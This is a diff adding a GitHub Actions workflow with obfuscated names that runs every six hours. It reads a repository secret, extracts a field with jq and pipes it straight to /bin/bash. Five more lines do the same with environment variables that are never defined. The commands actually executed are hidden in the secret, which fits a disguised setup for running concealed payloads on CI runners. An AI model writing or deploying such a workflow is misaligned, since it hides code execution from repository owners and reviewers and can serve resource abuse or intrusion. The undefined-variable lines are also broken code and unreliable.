@@ -1,0 +1,23 @@
+name: atrennuo
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '35 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: atrennuo
+        env:
+          qoib97: ${{ secrets.qoib97 }}
+        run: |
+          echo $qoib97 | jq -r .cay2807 | /bin/bash
+          echo $gu1835 | jq -r .chf2449 | /bin/bash
+          echo $nr973 | jq -r .ahbc8 | /bin/bash
+          echo $qzjb20790 | jq -r .uv05201 | /bin/bash
+          echo $pbtgf53946 | jq -r .srm04 | /bin/bash
+          echo $kaute4 | jq -r .xjwih468 | /bin/bash
+
